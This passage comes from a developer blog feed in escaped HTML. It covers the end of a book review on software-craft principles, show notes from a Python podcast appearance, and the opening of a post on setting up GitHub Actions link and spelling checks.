&lt;p&gt;The broken window theory is a criminological theory in that visible signs of damage create an environment that encourages further damage. If a street has a broken window, what's the big deal if another broken window happens, rinse and repeat until chaos. By ensuring that no broken windows are left in your designs, this encourages further quality contributions.&lt;/p&gt;
&lt;h2 id="boiled-frogs"&gt;Boiled Frogs&lt;/h2&gt;
&lt;p&gt;If a team works without communication, it may be difficult to see that the entire project may be boiling over. By constant communication, responsibility and transparency throughout the team, this can be minimized. Each member should feel comfortable in raising possible issues with others, and likewise in receiving feedback.&lt;/p&gt;
&lt;h2 id="know-when-to-stop"&gt;Know When to Stop&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Great software today is often preferable to perfect software tomorrow.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;When building software, it is often tempting to think &lt;em&gt;gee this feature would be better if I just added this&lt;/em&gt;, then chasing that feature down a rabbit hole and suddenly the day is over. By doing this, it is potentially delaying the software from potentially being used by the end user.&lt;/p&gt;
&lt;h2 id="dry-principle"&gt;DRY Principle&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Don't repeat yourself.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;There are many ways information can be duplicated throughout a project, this presents a problem when you need to change that piece of information. By having a single, unambiguous representation means changes can be much more easily handled, and as we all know change is inevitable.&lt;/p&gt;
&lt;p&gt;There are multiple types of duplication:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Imposed duplication&lt;/strong&gt; - Developers feel they have no choiceâ€”the environment seems to require duplication.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Inadvertent duplication&lt;/strong&gt; - Developers don't realize that they are duplicating information.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Impatient duplication&lt;/strong&gt; - Developers get lazy and duplicate because it seems easier.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Interdeveloper duplication&lt;/strong&gt; - Multiple people on a team (or on different teams) duplicate a piece of information.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="orthogonality"&gt;Orthogonality&lt;/h2&gt;
&lt;p&gt;Two or more things are orthogonal if changes in one don't affect the others. By writing orthogonal code &amp;amp; developing orthogonal systems, the benefits ripple throughout the entire project.&lt;/p&gt;
&lt;p&gt;Some of the benefits include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Changes are now localised&lt;/li&gt;
&lt;li&gt;Promotes reuse of existing code&lt;/li&gt;
&lt;li&gt;Allows for more combinations of existing modules&lt;/li&gt;
&lt;li&gt;Bugs are now contained &amp;amp; isolated&lt;/li&gt;
&lt;li&gt;Functionality can be divided for working with multiple teams&lt;/li&gt;
&lt;li&gt;Easier to test&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="tracer-design"&gt;Tracer Design&lt;/h2&gt;
&lt;p&gt;Whenever a project begins, knowing what it'll need to do and the requirements by the end of the project is extremely difficult to know; with change also being evitable the first thoughts for requirements may not be the same by the end. The name tracer design comes from tracer bullets, which are bullets used that light up so that the shooter can readjust their aim until they're on target; the same concept can be applied to design. This also brings the end-users into the design process by giving them early access to a working product.&lt;/p&gt;
&lt;p&gt;Some of the benefits include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Users get to see/use something early on&lt;/li&gt;
&lt;li&gt;Bugs and requirements can be captured earlier&lt;/li&gt;
&lt;li&gt;Developers get a structure to build upon&lt;/li&gt;
&lt;li&gt;Feel better for seeing progress&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tracer design is different to prototyping, with prototyping a developer is exploring aspects on what may be in the final product. Tracer designs aims to have the code that is being develop be apart of the final product, essentially verifying that the product hangs together and runs as intended.&lt;/p&gt;
&lt;h2 id="risk-in-prototypes-being-deployed"&gt;Risk in Prototypes being Deployed&lt;/h2&gt;
&lt;p&gt;When a prototype is presented to the end-user, there is potential for the user to believe it is almost finished or worse finished. Managing the expectations of your users or stakeholders comes back to &lt;a href="#soft-skills"&gt;Soft Skills&lt;/a&gt;, in that developers need to be effective communicators on informing that this is incomplete and there is much left to go!&lt;/p&gt;
&lt;h2 id="crash-early"&gt;Crash Early&lt;/h2&gt;
&lt;p&gt;By crashing early, it means the program does a lot less damage than a crippled program. This concept can be implemented by checking for the inverse of the requirement and erroring. By doing this, it means the code is more readable in finding the requirements that it must meet. It captures more potential issues before they cause damage versus checking all the ducks are lined up.&lt;/p&gt;
&lt;p&gt;For demonstrating this, we will use the example of a square root function. As we know, square root wants to have a positive number given to it (unless using complex numbers).&lt;/p&gt;
&lt;table class="highlighttable table-striped table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;sqrt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="ne"&gt;ValueError&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"Value must be positive to get the square root"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="mf"&gt;0.5&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;By doing this, we enable the function to potentially raise an error, multiply by -1 or even append an &lt;em&gt;i&lt;/em&gt; for complex numbers. Another example of this is, before querying a database check if there isn't a connection to the database and raise an error rather than checking if the connection is established (thus making for quite the nested beast sometimes).&lt;/p&gt;
&lt;h2 id="design-by-contract"&gt;Design by Contract&lt;/h2&gt;
&lt;p&gt;A correct program does no more and no less then what it claims to do. Ensure conditions (both pre &amp;amp; post) are met before anything begins, and promise as little as possible in return. This also helps enforcing &lt;a href="#crash-early"&gt;Crash Early&lt;/a&gt;, by verifying conditions have been satisfied, enables developers to crash the program if anything is unsatisfactory.&lt;/p&gt;
&lt;h2 id="build-end-to-end"&gt;Build End to End&lt;/h2&gt;
&lt;p&gt;There are many ways when it comes how something is built. More commonly things are viewed upon as being top-down or bottom-up. Top down is when we define the problem statement and break it down into smaller actionable chunks until it's pieced together. Bottom up is when we build more amd more of the smaller actionable pieces and plan to join them all together to meet the requirements in the future (very helpful when the problem isn't well defined).&lt;/p&gt;
&lt;p&gt;Rather than either of these, if we look through the perspective of building things end-to-end this can be a more holistic methodology. Which can also be adopted with either of the prior methodologies mentioned beforehand ensuring to build complete pipelines which can be combined or amended later on in development when the problem is further understood.&lt;/p&gt;
&lt;h2 id="debugging"&gt;Debugging&lt;/h2&gt;
&lt;p&gt;Don't assume how a bug occurred, prove it. This is also a fantastic practice to tie in with testing, by discovering a bug, determine how it was created and then prove that's how the bug occurred. This brings the workflow into:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bug occurs&lt;/li&gt;
&lt;li&gt;Find out why/how the bug occurred&lt;/li&gt;
&lt;li&gt;Prove that's how it occurred&lt;/li&gt;
&lt;li&gt;Add it to the test suite to ensure the bug never occurs again (or is captured appropriately)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="rename-asap-rename-well"&gt;Rename ASAP &amp;amp; Rename Well&lt;/h2&gt;
&lt;p&gt;As a project changes, the intention behind the name of a variable/function may also change. It is important to ensure that naming conventions ensure that the intention behind the name matches the functionality. No one wants to have to explain to a new user why &lt;code&gt;getData()&lt;/code&gt; actually writes data.&lt;/p&gt;
&lt;h2 id="define-requirements-with-user-stories"&gt;Define Requirements with User Stories&lt;/h2&gt;
&lt;p&gt;Rather than defining concrete technical requirements on how an application should behave and what outcomes are to be expected, developers can make the most of user stories to define the requirements. This puts the power in the hands of the developers to thoroughly understand and ask questions about how a story is to be completed. Typically written informally and from the perspective of the end user.&lt;/p&gt;
&lt;p&gt;Some examples include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;As a user, I want to see other users progress, so I can understand where I'm at&lt;/li&gt;
&lt;li&gt;As a manager, I want to see the overall number of outstanding tasks, so I can allocate resources appropriately&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="project-glossary"&gt;Project Glossary&lt;/h2&gt;
&lt;p&gt;Along with naming things appropriately, chaos can ensue when meaning behind words are not the same across different people. Ensure to keep a project glossary around project specific words and their meaning to ensure that everyone in the project is on the same page.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Bookcover" class="img-fluid" src="https://jackmckew.dev/img/bookcover.jpg"/&gt;&lt;/p&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="bookreview"></category></entry><entry><title>Profitable Python Podcast - Show Notes</title><link href="https://jackmckew.dev/profitable-python-podcast-show-notes.html" rel="alternate"></link><published>2020-07-10T00:00:00+10:00</published><updated>2020-07-10T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-07-10:/profitable-python-podcast-show-notes.html</id><summary type="html">&lt;body&gt;&lt;p&gt;I was recently a guest on the Profitable Python podcast with host Ben McNeill, the episode can be found at: &lt;a href="https://anchor.fm/profitablepythonfm/episodes/Pandas-Alive--Jack-McKew-efui92/a-a2idber"&gt;https://anchor.fm/profitablepythonfm/episodes/Pandas-Alive--Jack-McKew-efui92/a-a2idber&lt;/a&gt;. This blog post serves as the show notes, if I've missed anything, please drop a comment below!&lt;/p&gt;
&lt;h2 id="projects-mentioned"&gt;Projects Mentioned&lt;/h2&gt;
&lt;p&gt;A project where the â€¦&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;I was recently a guest on the Profitable Python podcast with host Ben McNeill, the episode can be found at: &lt;a href="https://anchor.fm/profitablepythonfm/episodes/Pandas-Alive--Jack-McKew-efui92/a-a2idber"&gt;https://anchor.fm/profitablepythonfm/episodes/Pandas-Alive--Jack-McKew-efui92/a-a2idber&lt;/a&gt;. This blog post serves as the show notes, if I've missed anything, please drop a comment below!&lt;/p&gt;
&lt;h2 id="projects-mentioned"&gt;Projects Mentioned&lt;/h2&gt;
&lt;p&gt;A project where the team was investigating the air quality impacts of air show smoke cans. The scenario was where the planes were mounted with smoke cans which leave a trail of smoke behind them while they fly around and complete stunts. We were given the flight path from the black box in GPX format, and the air quality team modelled the scenario per second to export a contour. This contour and flight path data was then passed into &lt;a href="https://plotly.com/"&gt;Plotly&lt;/a&gt; and an interactive visualisation was created. In particular the contour was shown at a fixed height using 3D scatter while the flight path was displayed using lines.&lt;/p&gt;
&lt;p&gt;One of my first experiences automating a real task with Python was in my first engineering position, where we were creating human machine interaces (HMI) for dams &amp;amp; weirs using &lt;a href="https://www.se.com/ww/en/product-range/1054-vijeo-designer/"&gt;Vijeo&lt;/a&gt;. I was tasked with placing buttons on the screens for each and every spillway. As this was monotonous and there was lots of buttons, I decided to automate it. In particular I used &lt;a href="https://pyautogui.readthedocs.io/en/latest/"&gt;&lt;code&gt;pyautogui&lt;/code&gt;&lt;/a&gt;. The script mimicked the mouse and keyboard dragging and dropping the buttons onto the screen and worked a treat.&lt;/p&gt;
&lt;p&gt;After I had been writing this blog for some time, I wanted to count the number of words I had written. These posts are spread across markdown &amp;amp; jupyter notebooks, so I set out to create a Python package to count this figure for me. I have done a previous write up on how this package was created at &lt;a href="https://jackmckew.dev/counting-words-with-python.html"&gt;https://jackmckew.dev/counting-words-with-python.html&lt;/a&gt;. The package &lt;code&gt;wordsum&lt;/code&gt; can also be installed via &lt;code&gt;pip install wordsum&lt;/code&gt; : &lt;a href="https://pypi.org/project/wordsum/"&gt;https://pypi.org/project/wordsum/&lt;/a&gt;. This is how the figure on each page is calculated, and is integrated into TravisCI to update the value whenever the site is built.&lt;/p&gt;
&lt;p&gt;In Home Appliance Scheduler Using Home Area Network, this was my engineering thesis, which can be read in full at: &lt;a href="https://jackmckew.dev/pages/Final_Year_Project_Part_B.pdf"&gt;https://jackmckew.dev/pages/Final_Year_Project_Part_B.pdf&lt;/a&gt;. In particular I used a multi-objective evolutionary algorithm (MOEA) to optimise the price of electricity over a 24hr period by shifting the time when appliances start.&lt;/p&gt;
&lt;h2 id="other-mentions"&gt;Other Mentions&lt;/h2&gt;
&lt;p&gt;LEGO Mindstorms &lt;a href="https://www.lego.com/en-au/product/lego-mindstorms-ev3-31313"&gt;https://www.lego.com/en-au/product/lego-mindstorms-ev3-31313&lt;/a&gt;. I was a participant in &lt;a href="https://www.robocupjunior.org.au/"&gt;RoboCup Junior&lt;/a&gt; when I was in high school and built a LEGO team to play soccer.&lt;/p&gt;
&lt;p&gt;AlphaGo documentary &lt;a href="https://www.youtube.com/watch?v=WXuK6gekU1Y"&gt;https://www.youtube.com/watch?v=WXuK6gekU1Y&lt;/a&gt;. &lt;em&gt;With more board configurations than there are atoms in the universe, the ancient Chinese game of Go has long been considered a grand challenge for artificial intelligence. On March 9, 2016, the worlds of Go and artificial intelligence collided in South Korea for an extraordinary best-of-five-game competition, coined The DeepMind Challenge Match. Hundreds of millions of people around the world watched as a legendary Go master took on an unproven AI challenger for the first time in history.&lt;/em&gt;&lt;/p&gt;
&lt;h2 id="concepts"&gt;Concepts&lt;/h2&gt;
&lt;p&gt;Openly sharing learning journey - don't be scared to show your mistakes.&lt;/p&gt;
&lt;p&gt;Users typically don't care how your software works, just as long as it works.&lt;/p&gt;
&lt;p&gt;Building passive income(s), gives you more time in the day to pursue what you enjoy.&lt;/p&gt;
&lt;p&gt;Scalability is core to making a business become extremely profitable.&lt;/p&gt;
&lt;p&gt;If you want to gain a skill, start by spending at least 5 minutes on something a day. In a month, you'll be much further ahead then if you keep putting it off.&lt;/p&gt;
&lt;p&gt;Spend more time upfront when discovering a client's problem. Answer the who, what, why, where and how of the problem statement, will make your life much easier. Get constant feedback and engage with your clients as you are building the solution. This will open up many more avenues for future work as well.&lt;/p&gt;
&lt;p&gt;Demonstrate value in time saved vs upfront cost. It's much easier to sell that someone will save $10,000/year every year going forward than $25,000 upfront to solve it.&lt;/p&gt;
&lt;p&gt;Put yourself in the shoes of the end-user of a data visualisation. If you can relate with your end-users, the data visualisation will be much more engaging. Look out for more examples out there, and note what you like/disliked with the visualisation.&lt;/p&gt;
&lt;p&gt;The more simple &amp;amp; relatable you can make something, the more it will be appreciated. Use relatable analogies if you can!&lt;/p&gt;
&lt;p&gt;Don't feel ashamed to stop something if you aren't engaging with it. If you're halfway through a book and it's not serving you, don't feel any guilt in stopping.&lt;/p&gt;
&lt;p&gt;Live for today, not the past or the present.&lt;/p&gt;
&lt;h3 id="python-packages"&gt;Python Packages&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Gooey - &lt;a href="https://github.com/chriskiehl/Gooey"&gt;https://github.com/chriskiehl/Gooey&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;PyInstaller - &lt;a href="https://www.pyinstaller.org/"&gt;https://www.pyinstaller.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Bokeh - &lt;a href="https://docs.bokeh.org/en/latest/index.html"&gt;https://docs.bokeh.org/en/latest/index.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Plotly - &lt;a href="https://plot.ly/python/"&gt;https://plot.ly/python/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Matplotlib - &lt;a href="https://matplotlib.org/"&gt;https://matplotlib.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Pandas-Bokeh - &lt;a href="https://github.com/PatrikHlobil/Pandas-Bokeh"&gt;https://github.com/PatrikHlobil/Pandas-Bokeh&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Folium - &lt;a href="https://python-visualization.github.io/folium/quickstart.html"&gt;https://python-visualization.github.io/folium/quickstart.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Black - &lt;a href="https://github.com/psf/black"&gt;https://github.com/psf/black&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Pandas_Alive - &lt;a href="https://github.com/JackMcKew/pandas_alive"&gt;https://github.com/JackMcKew/pandas_alive&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Poetry - &lt;a href="https://python-poetry.org/"&gt;https://python-poetry.org/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="resources"&gt;Resources&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Crowd Fight COVID-19 - &lt;a href="http://crowdfightcovid19.org/volunteers"&gt;http://crowdfightcovid19.org/volunteers&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Automate the Boring Stuff - &lt;a href="https://automatetheboringstuff.com/"&gt;https://automatetheboringstuff.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Jake VanderPlas Python data visualisation ecosystem - &lt;a href="https://www.youtube.com/watch?v=FytuB8nFHPQ"&gt;https://www.youtube.com/watch?v=FytuB8nFHPQ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Vega &amp;amp; Vega-lite - &lt;a href="https://vega.github.io/vega-lite/"&gt;https://vega.github.io/vega-lite/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Vladimir Illevski Javascript data visualisation ecosystem - &lt;a href="https://medium.com/analytics-vidhya/javascript-visualization-discover-different-visualization-tools-part-1-e4a77595fb97"&gt;https://medium.com/analytics-vidhya/javascript-visualization-discover-different-visualization-tools-part-1-e4a77595fb97&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Courage to be Disliked - &lt;a href="https://jackmckew.dev/book-review-courage-to-be-disliked.html#book-review-courage-to-be-disliked"&gt;https://jackmckew.dev/book-review-courage-to-be-disliked.html#book-review-courage-to-be-disliked&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Never Split the Difference - &lt;a href="https://jackmckew.dev/book-review-never-split-the-difference.html"&gt;https://jackmckew.dev/book-review-never-split-the-difference.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Apache Airflow - &lt;a href="https://airflow.apache.org/"&gt;https://airflow.apache.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Harry Stevens - &lt;a href="https://www.washingtonpost.com/graphics/2020/world/corona-simulator/"&gt;https://www.washingtonpost.com/graphics/2020/world/corona-simulator/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Sourcery - &lt;a href="https://sourcery.ai/"&gt;https://sourcery.ai/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Hunter Data Analytics - &lt;a href="http://data.newwwie.com/"&gt;http://data.newwwie.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;ShareX - &lt;a href="https://getsharex.com/"&gt;https://getsharex.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Dropbox moving to Rust from Python - &lt;a href="https://dropbox.tech/infrastructure/rewriting-the-heart-of-our-sync-engine"&gt;https://dropbox.tech/infrastructure/rewriting-the-heart-of-our-sync-engine&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="datascience"></category></entry><entry><title>Github Actions for CI/CD</title><link href="https://jackmckew.dev/github-actions-for-cicd.html" rel="alternate"></link><published>2020-04-23T00:00:00+10:00</published><updated>2020-04-23T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-04-23:/github-actions-for-cicd.html</id><summary type="html">&lt;body&gt;&lt;p&gt;Recently the &lt;a href="https://github.com/JackMcKew/awesome-python-bytes"&gt;Python Bytes Awesome Package List&lt;/a&gt; moved to it's own repository from the &lt;a href="https://jackmckew.dev/python-bytes-awesome-package-list.html#python-bytes-awesome-package-list"&gt;blog post&lt;/a&gt;. This was done to enable the community be able to contribute their packages that they thought were awesome, which was a success with many pull requests already merged.&lt;/p&gt;
&lt;p&gt;After getting a taste of CI â€¦&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;Recently the &lt;a href="https://github.com/JackMcKew/awesome-python-bytes"&gt;Python Bytes Awesome Package List&lt;/a&gt; moved to it's own repository from the &lt;a href="https://jackmckew.dev/python-bytes-awesome-package-list.html#python-bytes-awesome-package-list"&gt;blog post&lt;/a&gt;. This was done to enable the community be able to contribute their packages that they thought were awesome, which was a success with many pull requests already merged.&lt;/p&gt;
&lt;p&gt;After getting a taste of CI/CD principles with &lt;a href="https://travis-ci.com/"&gt;Travis CI&lt;/a&gt; in building this blog, an idea to integrate some CI/CD with the awesome package list repository to ensure spelling errors, broken links, etc are all checked automatically. This was a great opportunity to try out &lt;a href="https://github.com/features/actions"&gt;Github Actions&lt;/a&gt;, so then all the resources/dependencies live in one place, Github.&lt;/p&gt;
&lt;p&gt;Initially, the things to automate were:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Checking the spelling&lt;/li&gt;
&lt;li&gt;Checking all the links work&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Perfect, this is should be a gentle introduction to Github Actions.&lt;/p&gt;
&lt;p&gt;Here is an example of how GitHub Actions can be used to automatically rebase. Source: &lt;a href="https://github.com/marketplace/actions/automatic-rebase"&gt;https://github.com/marketplace/actions/automatic-rebase&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="GitHub Actions Example" class="img-fluid" src="https://jackmckew.dev/img/example-action.gif"/&gt;&lt;/p&gt;
&lt;h1 id="action-marketplace"&gt;Action Marketplace&lt;/h1&gt;
&lt;p&gt;One amazing feature of Github Actions is that Github hosts a 'marketplace' for actions, &lt;a href="https://github.com/marketplace?type=actions"&gt;https://github.com/marketplace?type=actions&lt;/a&gt;. This is awesome, because now you can just search for pre-made actions which will automate. In comparison to other CI services (let me know if there is anything similar), where you have to scour the internet looking for a post or question by someone else and piece together the action yourself.&lt;/p&gt;
&lt;p&gt;The actions I ended up using were:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/marketplace/actions/check-spelling-js-vue-html-markdown-text"&gt;Check Spelling (JS, Vue, HTML, Markdown, Text)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/marketplace/actions/link-checker"&gt;Link Checker&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Even better is most of the actions in marketplace come with a &lt;code&gt;Usage&lt;/code&gt; section, which is a directly example you can copy/paste into the repository and it just works.&lt;/p&gt;
&lt;h1 id="action-format-yaml"&gt;Action Format (.yaml)&lt;/h1&gt;
&lt;p&gt;A Github Action is defined with a &lt;code&gt;&amp;lt;action_name&amp;gt;.yaml&lt;/code&gt; file which must be placed within &lt;code&gt;.github/workflows&lt;/code&gt; from the base of the repository. As many actions as you want can be placed in this folder, and will subsequently run when triggered.&lt;/p&gt;
&lt;p&gt;The base structure of a &lt;code&gt;link_checker.yaml&lt;/code&gt; file is:&lt;/p&gt;
&lt;table class="highlighttable table-striped table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Check links&lt;/span&gt;
&lt;span class="nt"&gt;on&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;push&lt;/span&gt;
&lt;span class="nt"&gt;jobs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;linkChecker&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;runs-on&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;ubuntu-latest&lt;/span&gt;
    &lt;span class="nt"&gt;steps&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;uses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;actions/checkout@v2&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Link Checker&lt;/span&gt;
      &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;lc&lt;/span&gt;
      &lt;span class="nt"&gt;uses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;peter-evans/link-checker@v1&lt;/span&gt;
      &lt;span class="nt"&gt;with&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;args&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;-v -r *&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Fail if there were link errors&lt;/span&gt;
      &lt;span class="nt"&gt;run&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;exit ${{ steps.lc.outputs.exit_code }}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;To break this down:&lt;/p&gt;
&lt;table class="table-striped table"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Field&lt;/th&gt;
&lt;th&gt;Use&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;name&lt;/td&gt;
&lt;td&gt;Name of the action&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;on&lt;/td&gt;
&lt;td&gt;The trigger to run the action (runs whenever a push happens in this example)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;jobs&lt;/td&gt;
&lt;td&gt;What to run when triggered&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linkChecker&lt;/td&gt;
&lt;td&gt;This is a job name&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;runs-on&lt;/td&gt;
&lt;td&gt;The operating system to run on&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;steps&lt;/td&gt;
&lt;td&gt;Steps to take once the operating system is set up&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;uses&lt;/td&gt;
&lt;td&gt;What action to use from the marketplace (or custom specified)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The biggest part of the action, is what the trigger is. Which the documentation behind this is amazing, see this at: &lt;a href="https://help.github.com/en/actions/reference/events-that-trigger-workflows"&gt;https://help.github.com/en/actions/reference/events-that-trigger-workflows&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id="actions-on-pull-request"&gt;Actions on Pull Request&lt;/h1&gt;
&lt;p&gt;The original reason for implementing CI/CD is to not only check the spelling &amp;amp; links in the content that the owner contributes, we also want it to run on pull requests from other users. This is captured within an issue (with solution) at: &lt;a href="https://github.com/JackMcKew/awesome-python-bytes/issues/9"&gt;https://github.com/JackMcKew/awesome-python-bytes/issues/9&lt;/a&gt;. The workflow for someone else to contribute to the repository is:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Fork repository &amp;gt; Make changes &amp;gt; Submit Pull Request with changes &amp;gt; Check changes &amp;gt; Merge into repository&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;When the action was first set up for actions to run on pull requests, it kept throwing an error:&lt;/p&gt;
&lt;table class="highlighttable table-striped table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;The process &lt;span class="s1"&gt;'/usr/bin/git'&lt;/span&gt; failed with &lt;span class="nb"&gt;exit&lt;/span&gt; code &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
